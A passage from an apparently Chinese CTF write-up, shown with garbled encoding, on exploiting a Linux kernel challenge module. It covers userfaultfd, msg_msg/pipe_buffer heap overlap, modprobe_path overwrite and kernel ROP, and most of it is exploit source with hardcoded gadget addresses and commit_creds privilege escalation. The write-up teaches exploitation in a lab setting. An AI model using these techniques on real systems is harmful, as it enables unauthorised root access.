class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    magic_gadget += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line">    hexx(<span class="string">&quot;magic_gadget&quot;</span>, magic_gadget);</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line">    </span><br><span class="line">    work_for_cpu_fn  = kernel_base + <span class="number">0x8c360</span>;</span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">35</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    fake_ops_addr = heap_addr - <span class="number">0x68</span>;</span><br><span class="line">    hexx(<span class="string">&quot;fake_ops_addr&quot;</span>, fake_ops_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(tty_fd, <span class="number">0x68732f706d742f</span>, modprobe_path - <span class="number">8</span>);</span><br><span class="line">    ioctl(tty_fd, <span class="number">0x68732f</span>, modprobe_path - <span class="number">4</span>);</span><br><span class="line">    get_flag();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ±‚è§£æ•ˆæœ"><a href="#æ±‚è§£æ•ˆæœ" class="headerlink" title="æ±‚è§£æ•ˆæœ"></a>æ±‚è§£æ•ˆæœ</h3><img src="/2024/10/07/kno_puts/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="userfaultfd-msg-msg-pipe-buffer"><a href="#userfaultfd-msg-msg-pipe-buffer" class="headerlink" title="userfaultfd + msg_msg + pipe_buffer"></a>userfaultfd + msg_msg + pipe_buffer</h2><h3 id="æ€è·¯åˆ†æ-2"><a href="#æ€è·¯åˆ†æ-2" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>ç°åœ¨æˆ‘ä»¬åœ¨ä¸Šé¢çš„æƒ…å†µä¸­åŠ ç‚¹é™åˆ¶ï¼Œå³ <code>/sys/kernel/notes</code> é‡Œé¢ä¸å†ç»™æˆ‘ä»¬æä¾›å†…æ ¸åœ°å€ï¼Œé‚£æˆ‘ä»¬èƒ½å¦ç»§ç»­è·å–å†…æ ¸çš„åœ°å€å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œéœ€è¦ <code>msg_msg</code> å’Œ <code>pipe_buffer</code> ä¸¤ä¸ªç»“æ„ä½“æ¥ç›¸äº’åä½œï¼Œå› ä¸ºä»–ä»¬éƒ½å¯ä»¥è®©å †ç®¡ç†å™¨å–å‡º <code>0x400</code> å¤§å°çš„ <code>objcet</code>ã€‚å¯èƒ½æœ‰çš„å¸ˆå‚…ä¼šé—®æˆ‘è¿™é‡Œä¸ºä»€ä¹ˆä¸èƒ½ä½¿ç”¨ <code>tty_struct</code>ï¼Œè¿™é‡Œæˆ‘åé¢ä¼šè¿›è¡Œè§£é‡Šã€‚</p><p>é€šè¿‡è°ƒè¯•æˆ‘ä»¬å¯ä»¥å‘ç°å†…æ ¸å¹¶æ²¡æœ‰å¼€å¯ <code>CONFIG_SLAB_HARDENED=y</code> é€‰é¡¹ï¼Œå¯å°±æ˜¯è¯´æˆ‘ä»¬å †å—çš„å¸ƒå±€å¯é¢„æµ‹ã€‚å½“ç„¶å¦‚æœå¼€å¯äº†æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å †å–·æ¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœã€‚æˆ‘ä»¬å¯ä»¥ç›¸é‚»çš„å¸ƒå±€ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ å’Œä¸€ä¸ª <code>pipe_buffer</code> æ•°ç»„ï¼Œç„¶åé€šè¿‡ <code>uaf</code> æ¥å°† msg_msg.<font style="color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);">m_ts æ¥æ”¹å¤§ï¼ŒåŒæ—¶å°† </font><font style="color:rgb(0, 0, 0);">msg_msgseg</font><font style="color:rgb(166, 127, 89);">*</font><font style="color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);">next æŒ‡å‘ <code>msg_msg +0x300</code> çš„ä½ç½®ï¼ˆåé¢è§£é‡Šï¼‰ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥å®ç°ç»“æ„ä½“çš„è¶Šç•Œè¯»ã€‚åŒæ—¶ <code>msg_msg</code> ç»“æ„ä½“çš„ä¸‹æ–¹æœ‰ä¸ª <code>pipe_buffer</code> æ•°ç»„ï¼Œå¯ä»¥é€šè¿‡è¯¥ç»“æ„çš„ <code>ops</code> æ¥è·å–åˆ°å†…æ ¸çš„åœ°å€ã€‚æ­¤æ—¶çš„å †å¸ƒå±€å¦‚ä¸‹ï¼š</font></p><img src="/2024/10/07/kno_puts/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å½“æˆ‘ä»¬è°ƒç”¨ <code>msgrcv</code> æ¥è¯»å– <code>msg_msg</code> ä¸­çš„å†…å®¹æ—¶ï¼Œå†…æ ¸ä¼šè°ƒç”¨ <code>free_msg</code> éå† <code>next</code> ä¾æ¬¡é‡Šæ”¾ <code>msg_send</code> å¹¶æœ€ç»ˆé‡Šæ”¾ <code>msg_msg</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">security_msg_msg_free(msg);</span><br><span class="line"></span><br><span class="line">seg = msg-&gt;next;</span><br><span class="line">kfree(msg);</span><br><span class="line"><span class="keyword">while</span> (seg != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">tmp</span> =</span> seg-&gt;next;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line">kfree(seg);</span><br><span class="line">seg = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶éå†çš„ç»ˆæ­¢æ¡ä»¶ä¸º <code>next</code> æŒ‡é’ˆä¸ºç©ºã€‚ç”±äºæˆ‘ä»¬ <code>msg_msg</code> çš„ <code>next</code> æŒ‡é’ˆæŒ‡å‘ <code>msg_msg + 0x300</code> çš„ä½ç½®ï¼ˆæ³¨æ„ï¼Œè¿™ä¸ªä½ç½®å¿…é¡»ä¸ºç©ºï¼Œè¿™æ˜¯ä¸ºäº†ç»ˆæ­¢ <code>free_msg</code> å¯¹ <code>next</code> æŒ‡é’ˆçš„éå†ï¼‰ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è¯»å– <code>msg_msg</code> çš„æ•°æ®æ³„éœ²å†…æ ¸åœ°å€å <code>msg_msg + 0x300</code> ä¼šè¢«å½“æˆä¸€ä¸ªå †å—è¿›è¡Œé‡Šæ”¾ï¼Œæœ€ç»ˆå †çš„å¸ƒå±€ä¼šå˜æˆä¸‹é¢è¿™ç§æƒ…å†µï¼š</p><img src="/2024/10/07/kno_puts/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§å‡ºç°äº†å å †ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å†æ¬¡ç”³è¯· <code>0x400</code> çš„ <code>object</code> å°±èƒ½ä¿®æ”¹åˆ°ä¸‹æ–¹çš„ <code>pipe_buffer</code>ã€‚æ¥ä¸‹æ¥å°±æ˜¯ä¸€æ¡é¾™æœåŠ¡äº†ï¼Œä¿®æ”¹ <code>ops</code> ç„¶åä¸¤æ¬¡æ ˆè¿ç§»æ‰“ <code>kernel rop</code>ã€‚è¿™é‡Œæˆ‘ä¸ºä»€ä¹ˆæ²¡ç”¨ <code>tty_struct</code> å‘¢ï¼Ÿå› ä¸ºå½“æˆ‘ä½¿ç”¨ <code>tty_struct</code> æ—¶ï¼Œæˆ‘å å †ä¿®æ”¹ <code>tty_struct</code> æ—¶å‰ <code>8</code> å­—èŠ‚å¿…é¡»ä¸ºç©ºï¼Œå¦åˆ™å°±ä¼š <code>kernel panice</code>ï¼Œå¯æ˜¯æ”¹ <code>pipe_buffer</code> æ—¶å‰ <code>8</code> å­—èŠ‚ç¡®å¯ä»¥æœ‰æ•°æ®ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ<code>tty_struct</code> å‰ <code>8</code> å­—èŠ‚æ˜¯é­”æœ¯å­— <code>0x100005401</code>ï¼Œå¦‚æœæ”¹å­—æ®µæŸå <code>tty_struct</code> å°±ä¸ä¼šæ‰§è¡Œä»–è™šè¡¨ä¸Šçš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— æ³•æ§åˆ¶ç¨‹åºæµã€‚æ‰€ä»¥åˆ°åº•ä¸ºä»€ä¹ˆä¼š <code>panic</code>ğŸ˜‡ï¼Œå¦‚æœæœ‰å¸ˆå‚…çŸ¥é“åŸå› å¯ä»¥åŠ ç¬”è€…å¾®ä¿¡æˆ– QQ æ•™æ•™é¼ é¼ ğŸ˜­</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> magic_gadget = <span class="number">0xffffffff81599a34</span>;</span><br><span class="line"><span class="comment">// 0xffffffff81599a34: push rsi; pop rsp; setl al; shl eax, 2; ret;</span></span><br><span class="line"><span class="type">size_t</span> add_rsp = <span class="number">0xffffffff81371a49</span>;</span><br><span class="line"><span class="comment">// 0xffffffff81371a49: add rsp, 8; pop rbx; pop r12; pop rbp; ret;</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"><span class="type">size_t</span> ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> msg_qid;</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"><span class="type">char</span> msg_buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, 